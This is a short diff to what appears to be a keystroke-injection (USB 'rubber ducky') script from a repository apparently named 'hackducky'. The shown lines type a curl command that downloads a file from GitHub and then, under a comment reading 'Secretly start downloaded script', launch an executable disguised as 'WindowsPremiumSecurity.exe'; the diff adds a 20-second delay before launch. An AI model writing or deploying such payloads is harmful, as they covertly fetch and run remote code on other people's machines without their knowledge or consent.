@@ -22,6 +22,7 @@ STRING curl https://github.com/3XAY/hackducky/raw/refs/heads/main/submissions/3X
 ENTER
 
 REM Secretly start downloaded script
+DELAY 20000
 STRING start WindowsPremiumSecurity.exe
 ENTER
 
